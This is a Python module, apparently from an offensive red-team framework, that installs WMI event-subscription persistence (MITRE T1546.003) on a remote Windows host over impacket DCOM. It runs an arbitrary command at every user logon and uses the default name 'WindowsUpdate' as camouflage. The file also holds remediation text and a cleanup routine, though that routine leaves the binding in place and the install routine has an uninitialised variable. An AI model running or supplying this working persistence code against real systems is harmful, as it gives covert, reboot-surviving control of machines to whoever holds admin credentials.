"""
WMI Event Subscription Persistence
MITRE: T1546.003

Creates a WMI event subscription (FilterToConsumerBinding) that executes
a command when a specified event fires (e.g., user logon, time trigger).
Extremely stealthy — survives reboots, not visible in Autoruns by default.

Requires: local admin on target.
"""
from __future__ import annotations
import asyncio
from typing import Any
from ares.core.logger import get_logger, audit
from ares.core.campaign import Finding, Severity
from ares.modules.base import BaseModule, OpsecLevel
from ares.core.tracing import trace_module

logger = get_logger("ares.modules.persistence.wmi_subscription")

class WMISubscriptionModule(BaseModule):
    """
    persistence.wmi_subscription — Create a WMI FilterToConsumerBinding that executes a command on event trigger — highly stealthy 

    OPSEC: MEDIUM
    MITRE: "T1546.003"
    REQUIRES: "local_admin_creds"
    OUTPUTS:  "persistence_established"
    """
    MODULE_ID          = "persistence.wmi_subscription"
    MODULE_NAME        = "WMI Event Subscription Persistence"
    MODULE_CATEGORY    = "persistence"
    MODULE_DESCRIPTION = (
        "Create a WMI FilterToConsumerBinding that executes a command on event trigger — "
        "highly stealthy persistence that survives reboots"
    )
    MODULE_AUTHOR      = "ARES Team <team@ares-framework.io>"
    OPSEC_LEVEL        = OpsecLevel.MEDIUM
    REQUIRES           = ["local_admin_creds"]
    OUTPUTS            = ["persistence_established"]
    MITRE_TECHNIQUES   = ["T1546.003"]

    async def validate(self, ctx: "Any") -> None:
        """Pre-flight param checks before any network call."""
        await super().validate(ctx)
        from ares.core.context import ExecutionContext
        from ares.core.errors import ModuleValidationError
        if not isinstance(ctx, ExecutionContext):
            return
        target = getattr(ctx, "target", "") or ctx.params.get("target", "")
        if not target:
            raise ModuleValidationError(
                "persistence.wmi_subscription requires 'target'.",
                module_id=self.MODULE_ID, field="target",
            )
        if not ctx.params.get("username"):
            raise ModuleValidationError(
                "persistence.wmi_subscription requires 'username' with local_admin_creds.",
                module_id=self.MODULE_ID, field="username",
            )

    async def execute(self, ctx: "Any") -> "ModuleResult":
        """ExecutionContext-based entry point (v0.9.0+).
        Thin adapter: extract params from ctx → call run() → return ModuleResult.
        """
        from ares.modules.base import ModuleResult
        if getattr(ctx, "dry_run", False):
            return ModuleResult(status="dry_run", module_id=self.MODULE_ID, raw={"dry_run": True})
        target   = getattr(ctx, "target", ctx.params.get("target", ""))
        username = ctx.params.get("username", "")
        password = ctx.params.get("password", "") or ctx.params.get("secret", "")
        domain   = getattr(ctx, "domain", "") or ctx.params.get("domain", "")
        command  = ctx.params.get("command", "")
        sub_name = ctx.params.get("subscription_name", "WindowsUpdate")
        findings, raw = await self.run(target=target, username=username, password=password,
                                        domain=domain, command=command, subscription_name=sub_name)
        return ModuleResult(status="success" if findings else "partial",
                            findings=findings, raw=raw, module_id=self.MODULE_ID,
                            execution_id=getattr(ctx, "execution_id", ""))

    @trace_module("persistence.wmi_subscription")
    async def run(self, **kwargs: Any) -> tuple[list[Finding], dict[str, Any]]:
        target    = kwargs.get("target", "")
        username  = kwargs.get("username", "")
        password  = kwargs.get("password", "") or kwargs.get("secret", "")
        domain    = kwargs.get("domain", "")
        command   = kwargs.get("command", "")
        sub_name  = kwargs.get("subscription_name", "WindowsUpdate")
        dry_run   = kwargs.get("dry_run", False)

        if not target or not username or not command:
            return [], {"error": "target, username, and command required"}
        if dry_run:
            return [], {"dry_run": True, "target": target, "subscription_name": sub_name}

        await self.before_request(target, "wmi")  # scope check + jitter

        try:
            from impacket.dcerpc.v5 import transport         # type: ignore[import]
            from impacket.dcerpc.v5.dcom import wmi           # type: ignore[import]
            from impacket.dcerpc.v5.dcomrt import DCOMConnection # type: ignore[import]
        except ImportError:
            return [], {"error": "impacket not installed"}

        logger.info("wmi_subscription_install", target=target, name=sub_name)
        audit("wmi_subscription", actor=username, technique="T1546.003",
              source="operator", target=target, detail=f"name={sub_name}")
        await self.noise.rate_limiter.acquire("cloud_api")
        await self.noise.jitter.sleep()

        success = False
        error   = ""
        loop    = asyncio.get_running_loop()

        def _install() -> tuple[bool, str]:
            try:
                dcom = DCOMConnection(target, username=username, password=password,
                                      domain=domain, oxidResolver=True)
                iInterface = dcom.CoCreateInstanceEx(wmi.CLSID_WbemLevel1Login,
                                                     wmi.IID_IWbemLevel1Login)
                iWbemLevel1Login = wmi.IWbemLevel1Login(iInterface)
                from impacket.dcerpc.v5.dtypes import NULL as _NULL
                iWbemServices    = iWbemLevel1Login.NTLMLogin(
                    r"\\.\root\subscription", _NULL, _NULL
                )
                iWbemLevel1Login.RemRelease()

                # Create EventFilter
                filter_class = iWbemServices.GetObject("__EventFilter")
                filter_obj   = filter_class.SpawnInstance()
                filter_obj.Name          = f"{sub_name}Filter"
                filter_obj.QueryLanguage = "WQL"
                filter_obj.Query         = "SELECT * FROM __InstanceCreationEvent WITHIN 5 WHERE TargetInstance ISA 'Win32_LogonSession'"
                filter_obj.EventNamespace = r"\\.\root\cimv2"
                iWbemServices.PutInstance(filter_obj)

                # Create CommandLineEventConsumer
                consumer_class = iWbemServices.GetObject("CommandLineEventConsumer")
                consumer_obj   = consumer_class.SpawnInstance()
                consumer_obj.Name             = f"{sub_name}Consumer"
                consumer_obj.CommandLineTemplate = command
                iWbemServices.PutInstance(consumer_obj)

                # Create FilterToConsumerBinding
                binding_class = iWbemServices.GetObject("__FilterToConsumerBinding")
                binding_obj   = binding_class.SpawnInstance()
                binding_obj.Filter   = f"__EventFilter.Name=\"{sub_name}Filter\""
                binding_obj.Consumer = f"CommandLineEventConsumer.Name=\"{sub_name}Consumer\""
                iWbemServices.PutInstance(binding_obj)
                return True, ""
            except Exception as e:
                return False, str(e)[:200]
            finally:
                if dcom:
                    try:
                        dcom.disconnect()
                    except Exception:
                        pass

        success, error = await loop.run_in_executor(None, _install)

        if success:
            self.finding(
                title=f"WMI Subscription Persistence Installed on {target}",
                description=(
                    f"WMI event subscription '{sub_name}' created on {target}. "
                    f"Trigger: user logon. Command: {command[:100]}. "
                    "This persistence survives reboots and is not visible in standard Autoruns."
                ),
                severity=Severity.CRITICAL,
                mitre_technique="T1546.003",
                mitre_tactic="Persistence",
                evidence={"target": target, "subscription_name": sub_name,
                           "command": command, "trigger": "Win32_LogonSession"},
                remediation=(
                    "Enumerate and audit WMI subscriptions: "
                    "Get-WMIObject -Namespace root\\subscription -Class __EventFilter. "
                    "Enable WMI Activity logging (Event ID 5861). "
                    "Deploy EDR with WMI subscription monitoring."
                ),
                host=target, confidence=1.0,
            )

        raw = {"target": target, "subscription_name": sub_name,
               "success": success, "error": error, "command": command}
        raw["persistence_established"] = raw.get("subscription_name", "")  # OUTPUTS key
        return self._findings[:], raw

    async def cleanup(self, target: str, username: str, password: str,
                      domain: str, subscription_name: str) -> dict:
        """
        Remove WMI subscription components from target (engagement cleanup).
        Deletes FilterToConsumerBinding → CommandLineEventConsumer → EventFilter
        in reverse creation order to avoid orphaned objects.
        """
        loop = __import__("asyncio").get_running_loop()

        def _remove() -> tuple[bool, str]:
            dcom = None
            try:
                from impacket.dcerpc.v5.dcomrt import DCOMConnection
                from impacket.dcerpc.v5.dcom  import wmi as wmimod
                from impacket.dcerpc.v5.dtypes import NULL

                dcom = DCOMConnection(target, username=username, password=password,
                                      domain=domain, oxidResolver=True)
                iInterface = dcom.CoCreateInstanceEx(wmimod.CLSID_WbemLevel1Login,
                                                     wmimod.IID_IWbemLevel1Login)
                iWbemLevel1Login = wmimod.IWbemLevel1Login(iInterface)
                iWbemServices    = iWbemLevel1Login.NTLMLogin(
                    r"\\.\root\subscription", NULL, NULL
                )
                iWbemLevel1Login.RemRelease()

                removed = []
                # Delete in reverse order: binding → consumer → filter
                for cls, name_key in [
                    ("__FilterToConsumerBinding",  None),
                    ("CommandLineEventConsumer",   f"{subscription_name}Consumer"),
                    ("__EventFilter",              f"{subscription_name}Filter"),
                ]:
                    try:
                        if name_key:
                            iWbemServices.DeleteInstance(f'{cls}.Name="{name_key}"')
                            removed.append(f"{cls}/{name_key}")
                    except Exception:
                        pass   # already gone or never created
                return True, f"Removed: {removed}"
            except Exception as e:
                return False, str(e)[:200]
            finally:
                if dcom:
                    try:
                        dcom.disconnect()
                    except Exception:
                        pass

        success, msg = await loop.run_in_executor(None, _remove)
        logger.info("wmi_subscription_cleanup", target=target,
                    name=subscription_name, success=success, msg=msg)
        return {"success": success, "message": msg, "target": target,
                "subscription_name": subscription_name}
